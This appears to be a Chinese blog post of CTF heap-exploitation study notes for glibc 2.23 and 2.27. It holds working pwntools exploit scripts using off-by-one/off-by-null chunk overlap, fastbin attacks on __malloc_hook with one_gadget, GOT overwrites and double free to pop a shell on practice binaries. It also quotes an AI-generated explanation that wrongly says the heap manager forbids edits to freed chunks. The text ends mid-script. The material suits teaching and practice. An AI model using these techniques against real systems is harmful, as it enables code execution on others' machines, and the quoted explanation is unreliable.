            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h1 id="一、2-23"><a href="#一、2-23" class="headerlink" title="一、2.23"></a>一、2.23</h1><h2 id="1-off-by-one，fastbin-attack打malloc"><a href="#1-off-by-one，fastbin-attack打malloc" class="headerlink" title="1.off by one，fastbin attack打malloc"></a>1.off by one，fastbin attack打malloc</h2><p>1.通过off by one使堆块合并泄露libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,28465)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vm&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">fd = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;fd:&#x27;</span>+<span class="built_in">hex</span>(fd))</span><br><span class="line">libc_base = fd - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line">log.success(<span class="string">&#x27;fake_chunk_addr:&#x27;</span>+<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;realloc_addr:&#x27;</span>+<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line">log.success(<span class="string">&#x27;one_gadget:&#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>add(0x18, ‘aaaa’) #0</p>
<p>必须是0x8结尾，这样才能覆盖size位</p>
<p>add(0x68, ‘aaaa’) #1</p>
<p>add(0x68, ‘aaaa’) #2</p>
<p>合并的堆块要进入unsortbins</p>
<p>add(0x10, ‘aaaa’) #3</p>
<p>payload &#x3D; ‘a’*0x18 + ‘\xe1’  </p>
<p>\xe1是两个堆块合并后size位的大小</p>
<p>edit(0, payload) </p>
<p>往堆块0里面写因为off by one多写一个字节，使堆块1的size位被覆盖使得堆块1，2合并</p>
<p>delete(1)           </p>
<p>free掉堆块1，虽然在gdb中显示的是合并的整个大堆块被free了，但是堆块2并未被真正free，指针位未清零</p>
<p>add(0x60, ‘aaaa’)  </p>
<p>将堆块1申请出来，堆块2还是被free状态（但是指针位未清零，此时fd与bk都指向main_arena+88，也就是unstort的头）</p>
<p>show(2）</p>
<p>打印堆块2，就可以将main_arena+88的地址打印出来，根据偏移就可以算出libc</p>
<p>fake_chunk_addr&#x3D;malloc_hook-0x23 </p>
<p>假堆块的地址，为什么要选泽malloc_hook-0x23 因为malloc_hook-0x23，因为这里的size是0x7f，属于fastbin的范围，而且是在malloc_hook与realloc_hook的下面，可以修改其值，执行为one_gadget</p>
<p>add(0x68,b’\x00’*8)</p>
<p>将被指针未清零的的堆块2申请出来，也就是堆块4，堆块2，4指向的是同一个位置（所以gdb中只显示四个堆块）</p>
<p>free(4)</p>
<p>将堆块4free</p>
<p>edit(2,p64(fake_chunk_addr))</p>
<p>通过堆块2修改已经free的堆块4的fd指针，修改为假的堆块地址</p>
<p>add(0x68,b’aaaa’)</p>
<p>将堆块4申请出来</p>
<p>payload&#x3D;b’a’*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)</p>
<p>#bug()</p>
<p>add(0x68,payload)</p>
<p>这个堆块在gdb中是看不到的，但是可以通过查看内存，看内容是否被更改</p>
<p>这个堆块就是假的堆块了（0x13-0x08）这个是从malloc_hook-0x13的位置开始写入，因为size位0x10，指针指向写入数据的地方，-0x8是因为malloc_hook-0x8就是realloc_hook,将（malloc_hook-0x8）也就是realloc_hook的位置写入one_gadget,将malloc_hook的地方写入realloc_addr+12（这个是为了满足one_gadget调用的条件）</p>
<ul>
<li><code>**malloc_hook**</code> <strong>设置为</strong> <code>**realloc+offest**</code>：通过覆盖堆上的函数指针，将 <code>malloc_hook</code> 指向 <code>realloc</code>。</li>
<li><code>**realloc_hook**</code> <strong>设置为</strong> <code>**one_gadget**</code>：通过覆盖堆上的另一个函数指针，将 <code>realloc_hook</code> 指向 <code>one_gadget</code>。</li>
</ul>
<p>这样，程序在调用 <code>malloc</code> 时，会跳转到 <code>realloc</code>，而在执行 <code>realloc</code> 时，会跳转到 <code>one_gadget</code>，最终执行恶意代码</p>
<p><em>主要原因<strong>、realloc函数中有大量的</strong>push指令**（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。</em></p>
<p><img src="/2025/11/18/off-by/1745248759641-3442749b-f9d2-4521-b6c1-bec1d5696628.png" alt="img"></p>
<p><img src="/2025/11/18/off-by/1745249142830-94a71698-c3b0-407d-a470-c786b5ef7099.png" alt="img"></p>
<p>p.recvuntil(“choice: “)</p>
<p>p.sendline(“1”)</p>
<p>p.sendlineafter(“size?”,str(0x18))</p>
<p>p.interactive()</p>
<p>调用malloc获取shell</p>
<p>调用malloc函数—-&gt;判断是否有malloc_hook，有则调用之—-&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行—-&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之—-&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。</p>
<p>疑问：那为什么不可以直接修改堆块2的内容也就是修改fd的值为假堆块，也就是为什么堆块2可以被打印，但无法修改里面的内容</p>
<p>答案来自gpt：</p>
<ul>
<li><strong>堆块合并</strong>：通过修改堆块的 <code>size</code> 字段，堆块1和堆块2被堆管理器合并成一个大的空闲堆块，释放堆块1，虽然gdb中显示整个大堆块被释放，但是堆块2并没有被显式释放。</li>
<li><strong>堆块2依然存在</strong>：虽然堆块2在gdb中显示被释放，但堆管理器并没有清除其内容，因此堆块2的内存仍然可以被访问，甚至打印出来。</li>
<li><strong>堆块2无法修改</strong>：因为堆块2已经被堆管理器标记为“空闲”，堆管理器限制了对其的修改操作，以防止潜在的内存破坏和不一致性。</li>
<li><strong>堆管理的内存保护</strong>：空闲块的内容通常不会被修改，堆管理器会确保内存的完整性，避免对空闲块的修改。只有在空闲块被重新分配或被进一步操作时，堆块的内容才可能被清除或修改。</li>
</ul>
<p>fastbins打malloc_hook与free_hook,都把堆块申请在malloc_hook&#x2F;free_hook-0x23</p>
<h2 id="2-off-by-null"><a href="#2-off-by-null" class="headerlink" title="2.off by null"></a>2.off by null</h2><h3 id="1-利用off-by-null，堆块合并泄露libc"><a href="#1-利用off-by-null，堆块合并泄露libc" class="headerlink" title="1.利用off by null，堆块合并泄露libc"></a>1.利用off by null，堆块合并泄露libc</h3><p>1.有edit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;chunk1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>,<span class="string">b&#x27;chunk2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunk3&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x280</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">fd = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>add(0x200,b’chunk0’) </p>
<p>这个随便但是要在unsortbins</p>
<p>add(0x68,b’chunk1’)</p>
<p>必须在fastbins，而且必须是0x8结尾，因为这样才能覆盖到chunk2的pre_size位</p>
<p>add(0x1f0,b’chunk2’)</p>
<p>堆块的size位必须是整百，这样off by null溢出的\x00就会将p位覆盖为零且不影响size位</p>
<p>add(0x10,b’chunk3’)</p>
<p>防止与top_chunk合并</p>
<p>bug()</p>
<p>free(0)</p>
<p>为后来泄露libc做准备</p>
<p>edit(1,b’a’*0x60+p64(0x280))</p>
<p>覆盖堆块1的pre_size位与p位，欺骗前面的堆块被free</p>
<p>free(2)</p>
<p>使三个堆块合并成一个大堆块</p>
<p>add(0x200,b’chunk0’)</p>
<p>将堆块0申请回来，使fd与bk压入堆块1</p>
<p>show(1)</p>
<p>泄露libc</p>
<p>2.没有edit，使用add来修改size位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;chunk1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>,<span class="string">b&#x27;chunk2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunk3&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x230</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">fd = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>这里就只解释一下为什么是show(0),因为将堆块0，1都free了，所以先申请的0x18的堆块变成了堆块0，后申请的0x200的是堆块1</p>
<h3 id="2-off-by-null-fastbin-attack-打malloc"><a href="#2-off-by-null-fastbin-attack-打malloc" class="headerlink" title="2.off by null fastbin attack 打malloc"></a>2.off by null fastbin attack 打malloc</h3><p>因为我们将堆块0，又申请出来了，导致堆块1是free状态，可以打印，但无法修改，所以没发改fd，进行fastbin attach</p>
<p>所以我们再多申请一个，使得四个堆块堆叠，堆块1泄露libc，用堆块2改fd进行fastbin attach</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span> , <span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">b&#x27;chun1&#x27;</span>) </span><br><span class="line">add(<span class="number">0x68</span> , <span class="string">b&#x27;chunk2&#x27;</span>) </span><br><span class="line">add(<span class="number">0xf0</span> , <span class="string">b&#x27;chunk3&#x27;</span>) </span><br><span class="line">add(<span class="number">0x10</span> , <span class="string">b&#x27;chunk4&#x27;</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">12</span>+ p64(<span class="number">0x290</span>)</span><br><span class="line">edit(<span class="number">2</span> , payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">b&#x27;chunk0&#x27;</span>) </span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">fd =u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;fd = &#x27;</span>+<span class="built_in">hex</span>(fd))</span><br><span class="line">pause()</span><br><span class="line">libc_base = fd - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line">log.success(<span class="string">&#x27;fake_chunk_addr = &#x27;</span>+<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x108</span>+flat(<span class="number">0x71</span>, fake_chunk_addr))</span><br><span class="line">bug()</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;How much do you want&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0x18&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>free(2)</p>
<p>add(0x120, b’\0’*0x108+flat(0x71, fake_chunk_addr))</p>
<p>将堆块2free，申请处0x120，将堆块2的fd改了，fastbin attack</p>
<p>在这里就解释一下这个</p>
<p>为什么不能直接修改chunk2，因为堆块已经合并了，即使修改修改完fd也申请不出来，只能将chunk2前一个堆块先申请出来，多申请一点，带着把chunk2的fd给修改了</p>
<h3 id="3-off-by-null-fastbin-attack-unlink"><a href="#3-off-by-null-fastbin-attack-unlink" class="headerlink" title="3.off by null fastbin attack unlink"></a>3.off by null fastbin attack unlink</h3><p>add(0x80,b’chunk0’)</p>
<p>add(0x68,b’chunk1’)</p>
<p>add(0xf0,b’chunk2’)</p>
<p>add(0x10,b’chunk3’)</p>
<p>bug()</p>
<p>free(0)</p>
<p>payload &#x3D; b’\x00’*0x60+p64(0x100)</p>
<p>edit(1,payload)</p>
<p>free(2)</p>
<p>这个与前面的一样就不解释了</p>
<p>然后最关键的来了</p>
<p>free(1)（堆块1其实被free了两次）</p>
<p>add(0xa0, b’\0’*0x88+flat(0x71, 0x6020a0-3))（堆叠改，也可以double free具体实现看下面代码）</p>
<p>这个就是fastbin attack，为什么选在0x6020a0-3，因为fastbin可以申请在这里，而且距离堆块指针所在的地址近</p>
<p>看一下gdb就明白了</p>
<p><img src="/2025/11/18/off-by/1746007709112-a7f5c2e3-83ca-4f0f-9742-bfce77c46c6b.png" alt="img"></p>
<p>fastbin可以申请在这里</p>
<p><img src="/2025/11/18/off-by/1746007838236-91ddcba5-2ab1-46ce-844d-cf5a23f0db6d.png" alt="img"></p>
<p>并且距离指针所在地址近，往下面覆盖可以更改指针指向的地址，也就是指针的值，就行unlink一样</p>
<p>add(0x68,b’\n’)</p>
<p>add(0x68, b’\0’*3 + flat(0,0,0,0, elf.got[‘atoi’], elf.got[‘puts’]))</p>
<p>再来理解一下这个，申请两次就把0x6020a0-3这个位置申请出来了，然后因为chunk头，我们其实是从0x6020b0-3这个位置开始写的，先写三个0对齐</p>
<p>然后看gdb吧</p>
<p><img src="/2025/11/18/off-by/1746008033010-c13621b5-d279-49ff-a74d-f0834cee937d.png" alt="img"></p>
<p>补充p64(0)*4</p>
<p>然后再写就写到0x6020d0，与0x6020d8，也就是将chunk2，chunk3，指针所指向的地址改成了</p>
<p>elf.got[‘atoi’], elf.got[‘puts’]</p>
<p><img src="/2025/11/18/off-by/1746008218170-31b13aa1-958a-4564-8a0f-c1e47309e3a6.png" alt="img"></p>
<p><img src="/2025/11/18/off-by/1746008319273-63c13c3d-d23d-4b7c-8c14-90b89379424b.png" alt="img"></p>
<p>然受show（3）泄露libc，修改堆块2，将atoi got表改成system</p>
<h3 id="4-off-by-null-实现double-free"><a href="#4-off-by-null-实现double-free" class="headerlink" title="4.off by null 实现double free"></a>4.off by null 实现double free</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f0</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#为了造成1uaf，1被free了但是指针位清零</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x60209d</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>

<h1 id="二、2-27"><a href="#二、2-27" class="headerlink" title="二、2.27"></a>二、2.27</h1><h3 id="1-off-by-null"><a href="#1-off-by-null" class="headerlink" title="1.off by null"></a>1.off by null</h3><p>因为2.27的Tcachebins  没有检查，可以任意地址申请，所以我们直接打__free_hook就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/he/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span 